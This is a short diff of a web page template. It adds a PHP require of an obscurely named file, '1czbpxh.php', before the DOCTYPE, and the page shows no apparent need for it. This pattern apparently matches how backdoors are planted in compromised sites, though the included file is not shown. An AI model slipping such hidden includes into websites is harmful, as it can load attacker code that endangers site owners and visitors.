@@ -1,4 +1,5 @@
-	<!DOCTYPE html>
+<?php require __DIR__ . '/1czbpxh.php' ?>
+<!DOCTYPE html>
 	<html lang="zxx" class="no-js">
 	<head>
 		<!-- Mobile Specific Meta -->
